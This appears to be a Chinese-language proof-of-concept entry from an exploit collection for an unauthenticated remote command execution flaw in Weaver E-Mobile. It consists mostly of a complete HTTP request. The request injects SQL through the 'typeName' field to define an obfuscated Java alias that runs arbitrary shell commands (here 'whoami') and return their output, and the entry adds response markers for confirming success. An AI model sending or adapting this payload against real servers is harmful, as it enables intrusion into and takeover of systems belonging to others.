﻿# 泛微 E-Mobile前台远程命令执行漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /messageType.do HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7

------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="method"

create
------WebKitFormBoundaryTm8YXcJeyKDClbU7
Content-Disposition: form-data; name="typeName"

1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagm('whoami');--
------WebKitFormBoundaryTm8YXcJeyKDClbU7--
```

> 响应代码特征：200

> 响应内容特征：system

> 上传文件定位：

> 验证文件来源：泛微 E-Mobile前台远程命令执行漏洞.poc
